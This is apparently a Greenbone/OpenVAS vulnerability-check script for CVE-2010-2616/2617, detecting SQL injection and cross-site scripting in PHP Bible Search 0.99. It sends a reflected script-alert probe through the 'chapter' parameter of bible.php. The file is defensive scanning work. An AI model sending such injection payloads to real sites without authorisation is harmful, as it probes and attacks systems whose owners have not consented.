if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.801401" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2010-07-12 09:42:32 +0200 (Mon, 12 Jul 2010)" );
	script_cve_id( "CVE-2010-2616", "CVE-2010-2617" );
	script_bugtraq_id( 41197 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "PHP Bible Search 'bible.php' SQL Injection and Cross Site Scripting Vulnerabilities" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/59842" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/59843" );
	script_xref( name: "URL", value: "http://www.packetstormsecurity.com/1006-exploits/phpbiblesearch-sqlxss.txt" );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "impact", value: "Successful exploitation could allow the attackers to view, add,
  modify or delete information in the back-end database amd to execute arbitrary
  HTML and script code in a user's browser session in the context of an affected site." );
	script_tag( name: "affected", value: "PHP Bible Search version 0.99" );
	script_tag( name: "insight", value: "Input passed to the 'chapter' parameter in 'bible.php' script is
  not properly sanitised before being returned to the user." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "The host is running PHP Bible Search and is prone to SQL
  injection and cross site scripting vulnerabilities." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
vt_strings = get_vt_strings();
for dir in nasl_make_list_unique( "/phpbiblesearch", "/", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	req = http_get( item: dir + "/bible.php", port: port );
	res = http_keepalive_send_recv( port: port, data: req );
	if(ContainsString( res, ">PHP Bible Search ::<" )){
		req = http_get( item: NASLString( dir, "/bible.php?string=&book=2&chapter=" + "<script>alert('", vt_strings["lowercase"], "')</script>" ), port: port );
		res = http_keepalive_send_recv( port: port, data: req );
		if(( IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) && ContainsString( res, vt_strings["lowercase"] ) )){
			security_message( port: port );
			exit( 0 );
		}
	}
}
exit( 99 );

